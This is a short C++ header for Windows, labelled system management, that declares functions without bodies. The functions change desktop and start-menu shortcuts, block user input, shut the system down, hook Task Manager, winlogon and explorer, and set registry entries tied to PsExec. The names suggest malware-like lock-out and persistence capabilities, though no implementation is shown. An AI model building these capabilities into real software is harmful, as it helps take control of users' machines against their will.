#pragma once

#include <Windows.h>

#ifndef __SYSMGMT__
#define __SYSMGMT__

#include <string>

std::wstring get_desktop_path();

std::wstring get_public_desktop_path();

std::wstring get_start_menu_path();

std::wstring get_common_startmenu_path();

bool changeShortcut(LPCSTR dest, LPCWSTR target);

bool CheckUserLogined();

void ToggleInputBlocking(bool blockInput);

BOOL MySystemShutdown();

void hooktaskmgr();

void hookwinlogon();

void hookexplorer();

void refreshwindow();

void setRegistryPsExec();

#endif